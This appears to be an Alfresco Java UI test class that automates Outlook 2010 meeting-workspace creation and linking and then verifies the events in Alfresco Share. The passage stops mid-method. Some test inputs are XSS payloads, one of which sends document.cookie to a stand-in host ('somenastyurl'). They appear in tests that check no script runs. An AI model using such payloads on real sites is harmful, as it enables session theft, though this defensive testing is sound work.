/*
 * Copyright (C) 2005-2014 Alfresco Software Limited.
 * This file is part of Alfresco
 * Alfresco is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * Alfresco is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details.
 * You should have received a copy of the GNU Lesser General Public License
 * along with Alfresco. If not, see <http://www.gnu.org/licenses/>.
 */
package org.alfresco.share.sharepoint.office2010;

import static org.testng.Assert.assertTrue;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.List;
import java.util.Locale;

import org.alfresco.application.windows.MicorsoftOffice2010;
import org.alfresco.po.share.CustomiseUserDashboardPage;
import org.alfresco.po.share.DashBoardPage;
import org.alfresco.po.share.ShareLink;
import org.alfresco.po.share.SharePage;
import org.alfresco.po.share.dashlet.MyCalendarDashlet;
import org.alfresco.po.share.dashlet.MyMeetingWorkSpaceDashlet;
import org.alfresco.po.share.dashlet.MySitesDashlet;
import org.alfresco.po.share.dashlet.MySitesDashlet.FavouriteType;
import org.alfresco.po.share.dashlet.SiteCalendarDashlet;
import org.alfresco.po.share.enums.Dashlets;
import org.alfresco.po.share.enums.UserRole;
import org.alfresco.po.share.site.SiteDashboardPage;
import org.alfresco.po.share.site.SiteFinderPage;
import org.alfresco.po.share.site.SiteMembersPage;
import org.alfresco.po.share.site.SitePage;
import org.alfresco.po.share.site.calendar.CalendarPage;
import org.alfresco.po.share.site.calendar.InformationEventForm;
import org.alfresco.po.share.site.document.DocumentLibraryPage;
import org.alfresco.test.FailedTestListener;
import org.alfresco.share.util.AbstractUtils;
import org.alfresco.share.util.ShareUser;
import org.alfresco.share.util.ShareUserDashboard;
import org.alfresco.share.util.SiteUtil;
import org.alfresco.share.util.api.CreateUserAPI;
import org.alfresco.utilities.Application;
import org.testng.Assert;
import org.testng.annotations.AfterMethod;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Listeners;
import org.testng.annotations.Test;

import com.cobra.ldtp.Ldtp;

/**
 * @author bogdan.bocancea
 */

@Listeners(FailedTestListener.class)
public class MSOutlook2010Tests extends AbstractUtils
{
    private String testName;
    private String testUser;
    private String linkSite;
    private String xss_site, xss_location;
    private static SiteFinderPage siteFinder;
    private DashBoardPage dashBoard;
    private CustomiseUserDashboardPage customizeUserDash;
    MyMeetingWorkSpaceDashlet dashlet = null;

    MicorsoftOffice2010 outlook = new MicorsoftOffice2010(Application.OUTLOOK, "2010");
    private String next_site;
    private String sharePointPath;
    String errorMessage = "Your attempt to create a Meeting Workspace or link to an existing one can't be completed Reason Site name is not specified Please fill up subject field";
    String linkErrorMsj = "Your attempt to create a Meeting Workspace or link to an existing one can't be completed Reason Subject should be specified Please enter a subject";

    @BeforeClass(alwaysRun = true)
    public void setup() throws Exception
    {
        super.setup();

        next_site = "1";

        testName = this.getClass().getSimpleName();
        testUser = getUserNameFreeDomain(testName) + next_site;
        linkSite = testName + next_site;

        xss_location = "IMG STYLE=xss:expr/*XSS*/session(alert(XSS))";
        xss_site = "DIV STYLE=width:expression(alert(XSS))" + next_site;

        Runtime.getRuntime().exec("taskkill /F /IM OUTLOOK.EXE");
        sharePointPath = outlook.getSharePointPath();

    }

    @AfterMethod(alwaysRun = true)
    public void teardownMethod() throws Exception
    {
        Runtime.getRuntime().exec("taskkill /F /IM OUTLOOK.EXE");
        Runtime.getRuntime().exec("taskkill /F /IM CobraWinLDTP.EXE");
    }

    @Test(groups = { "DataPrepWord" })
    public void dataPrep() throws Exception
    {
        // Create normal User
        String[] testUser1 = new String[] { testUser };
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser1);
    }

    @Test(groups = "alfresco-one")
    public void AONE_9691() throws Exception
    {
        String testName = getTestName();
        String location = testName + " - Room";

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnCreateNewMeetingWorkspace(l, sharePointPath, linkSite, location, testUser, DEFAULT_PASSWORD, true, false);

        String windowNameSite = outlook.abstractUtil.waitForWindow(linkSite);
        Ldtp l1 = new Ldtp(windowNameSite);
        l1.activateWindow(windowNameSite);

        // "Go to workspace" link appears in Meeting Workspase sidebar.
        Assert.assertTrue(outlook.getAbstractUtil().isObjectDisplayed(l1, "hlnkGotoworkspace"));

        // paneMessage: is the pane that holds the new event informations
        // Meeting Workspace: sub (link)
        // Visit the workspace to learn more about this meeting or edit its contents" message is displayed in message field
        Assert.assertTrue(outlook.getAbstractUtil().isObjectDisplayed(l1, "paneMessage"));

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // navigate to site
        SiteDashboardPage siteDashBoard = SiteUtil.openSiteFromSearch(drone, linkSite);

        // navigate to Calendar
        CalendarPage calendarPage = siteDashBoard.getSiteNav().selectCalendarPage();
        Assert.assertTrue(calendarPage.isEventPresent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, linkSite));

        // verify event information
        InformationEventForm eventInfo = calendarPage.clickOnEvent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, linkSite).render();
        Assert.assertEquals(eventInfo.getWhatDetail(), linkSite);
        Assert.assertEquals(eventInfo.getWhereDetail(), location);

        String weekDay;
        SimpleDateFormat dayFormat = new SimpleDateFormat("EEEE, d MMMM, yyyy", Locale.US);

        Calendar calendar = Calendar.getInstance();
        weekDay = dayFormat.format(calendar.getTime());
        Assert.assertTrue(eventInfo.getStartDateTime().contains(weekDay));
        Assert.assertTrue(eventInfo.getEndDateTime().contains(weekDay));
        Assert.assertTrue(eventInfo.getDescriptionDetail().isEmpty());
        Assert.assertEquals(eventInfo.getTagName(), "(None)");

    }

    @Test(groups = "alfresco-one")
    public void AONE_9692() throws Exception
    {
        String testName = getTestName();
        String location = testName + " - Room";
        String subject = testName + next_site;

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnLinkToExistingWorkspace(l, sharePointPath, linkSite, subject, location, testUser, DEFAULT_PASSWORD, true);

        String windowNameSite = outlook.abstractUtil.waitForWindow(subject);
        Ldtp l1 = new Ldtp(windowNameSite);
        l1.activateWindow(windowNameSite);

        // "Go to workspace" link appears in Meeting Workspase sidebar.
        Assert.assertTrue(outlook.getAbstractUtil().isObjectDisplayed(l1, "hlnkGotoworkspace"));

        // paneMessage: is the pane that holds the new event informations
        // Meeting Workspace: sub (link)
        // Visit the workspace to learn more about this meeting or edit its contents" message is displayed in message field
        Assert.assertTrue(outlook.getAbstractUtil().isObjectDisplayed(l1, "paneMessage"));

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // navigate to site
        SiteDashboardPage siteDashBoard = SiteUtil.openSiteFromSearch(drone, linkSite);

        // navigate to Calendar
        CalendarPage calendarPage = siteDashBoard.getSiteNav().selectCalendarPage();
        Assert.assertTrue(calendarPage.isEventPresent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, subject));

        // verify event information
        InformationEventForm eventInfo = calendarPage.clickOnEvent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, subject).render();
        Assert.assertEquals(eventInfo.getWhatDetail(), subject);
        Assert.assertEquals(eventInfo.getWhereDetail(), location);

        String weekDay;
        SimpleDateFormat dayFormat = new SimpleDateFormat("EEEE, d MMMM, yyyy", Locale.US);

        Calendar calendar = Calendar.getInstance();
        weekDay = dayFormat.format(calendar.getTime());
        Assert.assertTrue(eventInfo.getStartDateTime().contains(weekDay));
        Assert.assertTrue(eventInfo.getEndDateTime().contains(weekDay));
        Assert.assertTrue(eventInfo.getDescriptionDetail().isEmpty());
        Assert.assertEquals(eventInfo.getTagName(), "(None)");

    }

    @Test(groups = "alfresco-one")
    public void AONE_9693() throws Exception
    {
        String testName = getTestName();
        String location = testName + " - Room";
        String siteName = "";
        Ldtp security = new Ldtp("Windows Security");

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        l.click("btnMeeting");

        // set focus on new window
        String windowNameUntitled = outlook.abstractUtil.waitForWindow("Untitled");
        Ldtp l1 = new Ldtp(windowNameUntitled);
        l.activateWindow(windowNameUntitled);

        l1.click("btnMeetingWorkspace");

        l1.click("hlnkChangesettings");
        l1.waitTime(2);
        l1.selectItem("cboWebsiteDropdown", "Other...");

        String windowNameServer = outlook.abstractUtil.waitForWindow("Other Workspace Server");
        Ldtp l2 = new Ldtp(windowNameServer);
        l.activateWindow(windowNameServer);

        l2.deleteText("txtServerTextbox", 0);
        l2.enterString("txtServerTextbox", sharePointPath);

        l2.click("btnOK");
        l2.waitTime(3);
        outlook.operateOnSecurity(security, testUser, DEFAULT_PASSWORD);

        windowNameUntitled = outlook.abstractUtil.waitForWindow("Untitled");
        Ldtp l3 = new Ldtp(windowNameUntitled);
        l3.activateWindow(windowNameUntitled);

        l3.click("btnOK");
        l3.enterString("txtLocation", location);

        l3.click("btnCreate");
        l3.waitTime(4);
        outlook.operateOnSecurity(security, testUser, DEFAULT_PASSWORD);

        String errorWindow = outlook.abstractUtil.waitForWindow("Microsoft Outlook");
        Ldtp error = new Ldtp(errorWindow);
        error.waitTime(5);
        error.activateWindow(errorWindow);

        String objects[] = error.getObjectList();
        String errorMessageObject = objects[2];
        errorMessageObject = errorMessageObject.replace("pane", "");
        String errorNoSpaces = errorMessage.replaceAll("\\s", "");
        Assert.assertTrue(errorMessageObject.equals(errorNoSpaces));

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // navigate to site
        SiteDashboardPage siteDashBoard = SiteUtil.openSiteFromSearch(drone, linkSite);

        // navigate to Calendar
        CalendarPage calendarPage = siteDashBoard.getSiteNav().selectCalendarPage();

        // verify that event is not present : siteName is empty, so it doesn't exists !
        Assert.assertFalse(calendarPage.isEventPresent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, siteName));

    }

    @Test(groups = "alfresco-one")
    public void AONE_9694() throws Exception
    {
        String testName = getTestName();
        String location = testName + " - Room";
        String subject = "";
        Ldtp security = new Ldtp("Windows Security");

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        l.click("btnMeeting");

        // set focus on new window
        String windowNameUntitled = outlook.abstractUtil.waitForWindow("Untitled");
        Ldtp l1 = new Ldtp(windowNameUntitled);
        l.activateWindow(windowNameUntitled);

        l1.click("btnMeetingWorkspace");

        l1.waitTime(2);
        l1.click("hlnkChangesettings");
        l1.click("rbtnLinktoanexistingworkspace");

        l1.mouseLeftClick("cboWorkspaceDropdown");
        l1.waitTime(4);
        outlook.operateOnSecurity(security, testUser, DEFAULT_PASSWORD);

        l1.selectItem("cboWorkspaceDropdown", linkSite);

        l1.click("btnOK");

        windowNameUntitled = outlook.abstractUtil.waitForWindow("Untitled");
        Ldtp allDay = new Ldtp(windowNameUntitled);
        allDay.activateWindow(windowNameUntitled);
        allDay.enterString("txtLocation", location);

        // click Link button
        allDay.click("btnLink");
        allDay.waitTime(4);
        outlook.operateOnSecurity(security, testUser, DEFAULT_PASSWORD);

        String errorWindow = outlook.abstractUtil.waitForWindow("Microsoft Outlook");
        Ldtp error = new Ldtp(errorWindow);
        error.activateWindow(errorWindow);
        error.waitTime(5);
        String objects[] = error.getObjectList();
        String errorMessageObject = objects[2];
        errorMessageObject = errorMessageObject.replace("pane", "");
        String errorNoSpaces = linkErrorMsj.replaceAll("\\s", "");
        Assert.assertTrue(errorMessageObject.equals(errorNoSpaces));

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // navigate to site
        SiteDashboardPage siteDashBoard = SiteUtil.openSiteFromSearch(drone, linkSite);

        // navigate to Calendar
        CalendarPage calendarPage = siteDashBoard.getSiteNav().selectCalendarPage();

        // verify that event is not present : siteName is empty, so it doesn't exists !
        Assert.assertFalse(calendarPage.isEventPresent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, subject));

    }

    @Test(groups = "alfresco-one")
    public void AONE_9695() throws Exception
    {
        String siteName = "!@#$%^*" + next_site;
        String location = "!@#$%^*()_+|?'=-{:}[]";

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnCreateNewMeetingWorkspace(l, sharePointPath, siteName, location, testUser, DEFAULT_PASSWORD, true, false);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // navigate to site
        SiteDashboardPage siteDashBoard = SiteUtil.openSiteFromSearch(drone, siteName);

        // navigate to Calendar
        CalendarPage calendarPage = siteDashBoard.getSiteNav().selectCalendarPage();
        Assert.assertTrue(calendarPage.isEventPresent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, siteName));

        // verify event information
        InformationEventForm eventInfo = calendarPage.clickOnEvent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, siteName).render();
        Assert.assertEquals(eventInfo.getWhatDetail(), siteName);
        Assert.assertEquals(eventInfo.getWhereDetail(), location);

    }

    @Test(groups = "alfresco-one")
    public void AONE_9696() throws Exception
    {
        String testName = getTestName();
        String location = testName + " - Room";

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnCreateNewMeetingWorkspace(l, sharePointPath, linkSite, location, testUser, DEFAULT_PASSWORD, true, false);

        String windowNameSite = outlook.abstractUtil.waitForWindow(linkSite);
        Ldtp l1 = new Ldtp(windowNameSite);
        l1.activateWindow(windowNameSite);

        // "Go to workspace" link appears in Meeting Workspase sidebar.
        Assert.assertTrue(outlook.getAbstractUtil().isObjectDisplayed(l1, "hlnkGotoworkspace"));

        // paneMessage: is the pane that holds the new event informations
        // Meeting Workspace: sub (link)
        // Visit the workspace to learn more about this meeting or edit its contents" message is displayed in message field
        Assert.assertTrue(outlook.getAbstractUtil().isObjectDisplayed(l1, "paneMessage"));

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD).render();

        // navigate to site
        SiteFinderPage siteFinderPage = SiteUtil.searchSiteWithRetry(drone, linkSite, true);
        siteFinderPage.selectSiteByIndex(0);
        String urlFirstSite = drone.getCurrentUrl();

        // 9. Verify that new Meeting workspace (<existed_name> e.g. event6969subject) is created;
        siteFinderPage = SiteUtil.searchSiteWithRetry(drone, linkSite, true);
        siteFinderPage.selectSiteByIndex(1);
        String urlFirstSite_1 = drone.getCurrentUrl();
        Assert.assertTrue(drone.getTitle().contains("Meeting Workspace Dashboard"));

        // 10. Check that urls of the sites are different e.g.
        // -> http://host:port/share/page/site/event6969subject/dashboard and
        // -> http://host:port/share/page/site/event6969subject_1/dashboard
        Assert.assertFalse(urlFirstSite.equals(urlFirstSite_1));
        Assert.assertTrue(urlFirstSite_1.contains(linkSite + "_1"));

    }

    @Test(groups = "alfresco-one")
    public void AONE_9697() throws Exception
    {
        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnCreateNewMeetingWorkspace(l, sharePointPath, xss_site, xss_location, testUser, DEFAULT_PASSWORD, true, false);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // navigate to site
        SiteDashboardPage siteDashBoard = SiteUtil.openSiteFromSearch(drone, xss_site);

        // navigate to Calendar
        CalendarPage calendarPage = siteDashBoard.getSiteNav().selectCalendarPage();
        Assert.assertTrue(calendarPage.isEventPresent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, xss_site));

        // verify event information
        // Calendar page is opened successfully. LInked appointment is displayed; NO XSS attack is made;
        InformationEventForm eventInfo = calendarPage.clickOnEvent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, xss_site).render();
        Assert.assertEquals(eventInfo.getWhatDetail(), xss_site);
        Assert.assertEquals(eventInfo.getWhereDetail(), xss_location);
    }

    @Test(groups = "alfresco-one")
    public void AONE_9698() throws Exception
    {
        String xss_location_new = "IMG STYLE=xss:expr/*XSS*/session(alert(XSS))";
        String xss_site_new = "img src=\"\" onerror=\"window.open(http://somenastyurl?+(document.cookie))" + next_site;

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        // Linking to existing workspace with XSS
        outlook.operateOnLinkToExistingWorkspace(l, sharePointPath, xss_site, xss_site_new, xss_location_new, testUser, DEFAULT_PASSWORD, true);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // navigate to site
        SiteDashboardPage siteDashBoard = SiteUtil.openSiteFromSearch(drone, xss_site);

        // navigate to Calendar
        CalendarPage calendarPage = siteDashBoard.getSiteNav().selectCalendarPage();
        Assert.assertTrue(calendarPage.isEventPresent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, xss_site_new));

        // verify event information
        // Calendar page is opened successfully. LInked appointment is displayed; NO XSS attack is made;
        InformationEventForm eventInfo = calendarPage.clickOnEvent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, xss_site_new).render();
        Assert.assertEquals(eventInfo.getWhatDetail(), xss_site_new);
        Assert.assertEquals(eventInfo.getWhereDetail(), xss_location_new);
    }

    @Test(groups = "alfresco-one")
    public void AONE_9699() throws Exception
    {
        String event = "!@#$%^*" + next_site;
        String location = "!@#$%^*()_+|?'=-{:}[]";

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnLinkToExistingWorkspace(l, sharePointPath, linkSite, event, location, testUser, DEFAULT_PASSWORD, true);

        String windowNameSite = outlook.abstractUtil.waitForWindow(event);
        Ldtp l1 = new Ldtp(windowNameSite);
        l1.activateWindow(windowNameSite);

        // "Go to workspace" link appears in Meeting Workspase sidebar.
        Assert.assertTrue(outlook.getAbstractUtil().isObjectDisplayed(l1, "hlnkGotoworkspace"));

        // paneNotes: is the pane that holds the new event informations
        // Meeting Workspace: sub (link)
        // Visit the workspace to learn more about this meeting or edit its contents" message is displayed in message field
        Assert.assertTrue(outlook.getAbstractUtil().isObjectDisplayed(l1, "paneMessage"));

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // navigate to site
        SiteDashboardPage siteDashBoard = SiteUtil.openSiteFromSearch(drone, linkSite);

        // navigate to Calendar
        CalendarPage calendarPage = siteDashBoard.getSiteNav().selectCalendarPage();
        Assert.assertTrue(calendarPage.isEventPresent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, event));

        // verify event information
        InformationEventForm eventInfo = calendarPage.clickOnEvent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, event).render();
        Assert.assertEquals(eventInfo.getWhatDetail(), event);
        Assert.assertEquals(eventInfo.getWhereDetail(), location);

        String weekDay;
        SimpleDateFormat dayFormat = new SimpleDateFormat("EEEE, d MMMM, yyyy", Locale.US);

        Calendar calendar = Calendar.getInstance();
        weekDay = dayFormat.format(calendar.getTime());
        Assert.assertTrue(eventInfo.getStartDateTime().contains(weekDay));
        Assert.assertTrue(eventInfo.getEndDateTime().contains(weekDay));
        Assert.assertTrue(eventInfo.getDescriptionDetail().isEmpty());
        Assert.assertEquals(eventInfo.getTagName(), "(None)");

    }

    @Test(groups = { "DataPrepMSOutlook" })
    public void dataPrep_9700() throws Exception
    {
        String testName = getTestName() + next_site;
        String siteName = getSiteName(testName);
        String location = testName + " - Room";

        String testUser = getUserNameFreeDomain(testName);

        // User 9700
        String[] testUserInfo = new String[] { testUser };
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUserInfo);

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnCreateNewMeetingWorkspace(l, sharePointPath, siteName, location, testUser, DEFAULT_PASSWORD, true, false);

    }

    @Test(groups = "alfresco-one")
    public void AONE_9700() throws Exception
    {
        String testName = getTestName() + next_site;
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // Navigate to Search For Site
        // Perform a search for Site1;
        SharePage page = drone.getCurrentPage().render();
        siteFinder = page.getNav().selectSearchForSites().render();
        siteFinder = org.alfresco.po.share.util.SiteUtil.siteSearchRetry(drone, siteFinder, siteName);

        // Click "Delete" button
        SiteUtil.deleteSiteWithConfirm(drone, siteName, true, true);

        Ldtp l = outlook.openOfficeApplication();

        outlook.getAbstractUtil().clickOnObject(l, "btnMeeting");

        Ldtp l2 = outlook.getAbstractUtil().setOnWindow("Untitled");

        outlook.getAbstractUtil().clickOnObject(l2, "btnMeetingWorkspace");

        outlook.getAbstractUtil().clickOnObject(l2, "hlnkChangesettings");
        outlook.getAbstractUtil().clickOnObject(l2, "rbtnLinktoanexistingworkspace");
        outlook.getAbstractUtil().clickOnObject(l2, "cboWorkspaceDropdown");

        outlook.operateOnSecurity(l2, testUser, DEFAULT_PASSWORD);

        outlook.getAbstractUtil().clickOnObject(l2, "cboWorkspaceDropdown");

        String items[] = l2.getAllItem("cboWorkspaceDropdown");
        String verify = items.toString();
        Assert.assertFalse(verify.contains(siteName));

    }

    @Test(groups = { "DataPrepMSOutlook" })
    public void dataPrep_9701() throws Exception
    {
        String testName = getTestName() + next_site;
        String siteName = getSiteName(testName);
        String location = testName + " - Room";

        String testUser = getUserNameFreeDomain(testName);

        // User 9701
        String[] testUserInfo = new String[] { testUser };
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUserInfo);

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnCreateNewMeetingWorkspace(l, sharePointPath, siteName, location, testUser, DEFAULT_PASSWORD, true, false);
    }

    @Test(groups = "alfresco-one")
    public void AONE_9701() throws Exception
    {
        String testName = getTestName() + next_site;
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        Ldtp l = outlook.openOfficeApplication();

        outlook.getAbstractUtil().clickOnObject(l, "btnMeeting");

        Ldtp l2 = outlook.getAbstractUtil().setOnWindow("Untitled");

        outlook.getAbstractUtil().clickOnObject(l2, "btnMeetingWorkspace");
        outlook.getAbstractUtil().clickOnObject(l2, "hlnkChangesettings");
        outlook.getAbstractUtil().clickOnObject(l2, "rbtnLinktoanexistingworkspace");
        outlook.getAbstractUtil().clickOnObject(l2, "cboWorkspaceDropdown");

        outlook.operateOnSecurity(l2, testUser, DEFAULT_PASSWORD);

        outlook.getAbstractUtil().clickOnObject(l2, "cboWorkspaceDropdown");

        l2.selectItem("cboWorkspaceDropdown", siteName);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // Navigate to Search For Site
        // Perform a search for Site1;
        SharePage page = drone.getCurrentPage().render();
        siteFinder = page.getNav().selectSearchForSites().render();
        siteFinder = org.alfresco.po.share.util.SiteUtil.siteSearchRetry(drone, siteFinder, siteName);

        // Click "Delete" button
        SiteUtil.deleteSiteWithConfirm(drone, siteName, true, true);

        // Click ok button;
        l2.click("btnOK");

        // Click "Link" button;
        l2.click("btnLink");

        outlook.operateOnSecurity(l2, testUser, DEFAULT_PASSWORD);
        l2.waitTime(3);
        String windowNameError = outlook.abstractUtil.waitForWindow("Microsoft Outlook");
        l2.waitTime(3);
        Ldtp l3 = new Ldtp(windowNameError);
        l3.activateWindow(windowNameError);
        l3.click("btnOK");

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // No new Workspace is displayed;
        Assert.assertFalse(SiteUtil.isSiteFound(drone, siteName));
    }

    @Test(groups = "alfresco-one")
    public void AONE_9702() throws Exception
    {
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        // SiteDashboardPage siteDashBoard = SiteUtil.openSiteFromSearch(drone, linkSite);

        Ldtp l = outlook.openOfficeApplication();

        outlook.getAbstractUtil().clickOnObject(l, "btnMeeting");

        Ldtp l2 = outlook.getAbstractUtil().setOnWindow("Untitled");

        outlook.getAbstractUtil().clickOnObject(l2, "btnMeetingWorkspace");
        outlook.getAbstractUtil().clickOnObject(l2, "hlnkChangesettings");
        outlook.getAbstractUtil().clickOnObject(l2, "rbtnLinktoanexistingworkspace");
        outlook.getAbstractUtil().clickOnObject(l2, "cboWorkspaceDropdown");

        outlook.operateOnSecurity(l2, testUser, DEFAULT_PASSWORD);

        l2.selectItem("cboWorkspaceDropdown", linkSite);
        l2.click("hlnkViewworkspace");

        // TODO: the site is opened in a new browser and the focus cannot be placed on the new page.
        // keep manual
    }

    @Test(groups = "alfresco-one")
    public void AONE_9703() throws Exception
    {
        String testName = getTestName() + next_site + "1";
        String location = testName + " - Room";
        String siteName = getSiteName(testName);

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        outlook.operateOnCreateNewMeetingWorkspace(l, sharePointPath, siteName, location, testUser, DEFAULT_PASSWORD, true, true);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // navigate to site
        SiteDashboardPage siteDashBoard = SiteUtil.openSiteFromSearch(drone, siteName);

        SiteCalendarDashlet siteCalendarDashlet = siteDashBoard.getDashlet("site-calendar").render();

        // Site calendar dashlet is marked as recurrence
        Assert.assertFalse(siteCalendarDashlet.isEventsDisplayed(siteName));

        // Calendar event is not displayed (in My Calendar Dashlet, Site Calendar Dashlet, and in the workspace's calendar tab);
        CalendarPage calendarPage = siteDashBoard.getSiteNav().selectCalendarPage();
        Assert.assertFalse(calendarPage.isEventPresent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, siteName));

        SharePage page = drone.getCurrentPage().render();
        dashBoard = page.getNav().selectMyDashBoard();

        customizeUserDash = dashBoard.getNav().selectCustomizeUserDashboard();
        customizeUserDash.render();

        dashBoard = customizeUserDash.addDashlet(Dashlets.MY_CALENDAR, 1).render();
        MyCalendarDashlet myCalendar = dashBoard.getDashlet("my-calendar").render();
        Assert.assertFalse(myCalendar.isEventsDisplayed(siteName));

    }

    @Test(groups = { "DataPrepMSOutlook" })
    public void dataPrep_9724() throws Exception
    {
        String testName = getTestName() + next_site;
        String siteName = getSiteName(testName);
        String location = testName + " - Room";

        String testUser = getUserNameFreeDomain(testName);

        // Create User
        String[] testUserInfo = new String[] { testUser };
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUserInfo);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // add My Meeting workspaces dashlet
        SharePage page = drone.getCurrentPage().render();
        dashBoard = page.getNav().selectMyDashBoard();

        customizeUserDash = dashBoard.getNav().selectCustomizeUserDashboard();
        customizeUserDash.render();

        dashBoard = customizeUserDash.addDashlet(Dashlets.MY_MEETING_WORKSPACES, 1).render();

        dashlet = new MyMeetingWorkSpaceDashlet(drone);
        Assert.assertNotNull(dashlet);

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnCreateNewMeetingWorkspace(l, sharePointPath, siteName, location, testUser, DEFAULT_PASSWORD, true, false);

    }

    @Test(groups = "alfresco-one")
    public void AONE_9724() throws Exception
    {

        String testName = getTestName() + next_site;
        String siteName = getSiteName(testName);
        String testUser = getUserNameFreeDomain(testName);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        dashlet = new MyMeetingWorkSpaceDashlet(drone);

        List<ShareLink> sites = dashlet.getSites();

        String foundSites = sites.toString();
        Assert.assertNotNull(sites);
        Assert.assertTrue(foundSites.contains(siteName));

    }

    @Test(groups = { "DataPrepMSOutlook" })
    public void dataPrep_9725() throws Exception
    {
        String testName = getTestName() + next_site;
        String testUser = getUserNameFreeDomain(testName);

        // Create User
        String[] testUserInfo = new String[] { testUser };
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUserInfo);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // add My Meeting workspaces dashlet
        SharePage page = drone.getCurrentPage().render();
        dashBoard = page.getNav().selectMyDashBoard();

        customizeUserDash = dashBoard.getNav().selectCustomizeUserDashboard();
        customizeUserDash.render();

        dashBoard = customizeUserDash.addDashlet(Dashlets.MY_MEETING_WORKSPACES, 1).render();

        dashlet = new MyMeetingWorkSpaceDashlet(drone);
        Assert.assertNotNull(dashlet);
    }

    @Test(groups = "alfresco-one")
    public void AONE_9725() throws Exception
    {

        String testName = getTestName() + next_site;
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        dashlet = new MyMeetingWorkSpaceDashlet(drone);

        List<ShareLink> sites = dashlet.getSites();
        Assert.assertFalse(sites.contains(siteName));

        Assert.assertTrue(dashlet.isNoMeetingWorkspaceDisplayed());

    }

    @Test(groups = { "DataPrepMSOutlook" })
    public void dataPrep_9726() throws Exception
    {
        String testName = getTestName() + next_site;
        String siteName = getSiteName(testName) + "1";
        String siteName2 = getSiteName(testName) + "2";
        String testUser = getUserNameFreeDomain(testName);
        String location = testName + " - Room";

        // Create User
        String[] testUserInfo = new String[] { testUser };
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUserInfo);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // add My Meeting workspaces dashlet
        SharePage page = drone.getCurrentPage().render();
        dashBoard = page.getNav().selectMyDashBoard();

        customizeUserDash = dashBoard.getNav().selectCustomizeUserDashboard();
        customizeUserDash.render();

        dashBoard = customizeUserDash.addDashlet(Dashlets.MY_MEETING_WORKSPACES, 1).render();

        dashlet = new MyMeetingWorkSpaceDashlet(drone);

        // MS Outlook 2010 is opened;
